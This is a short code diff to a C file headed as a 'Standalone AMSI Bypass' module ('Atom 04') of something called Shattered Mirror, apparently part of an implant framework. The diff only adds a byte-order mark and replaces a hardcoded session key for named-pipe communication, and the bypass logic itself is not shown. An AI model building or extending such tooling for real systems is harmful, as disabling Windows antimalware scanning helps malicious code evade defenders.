@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 04: Standalone AMSI Bypass
  *
  * Implements a self-contained version of the VEH/DR AMSI bypass that can
@@ -50,7 +50,7 @@ DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
+    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";
 
     while (TRUE) {
         IPC_MESSAGE inMsg = { 0 };
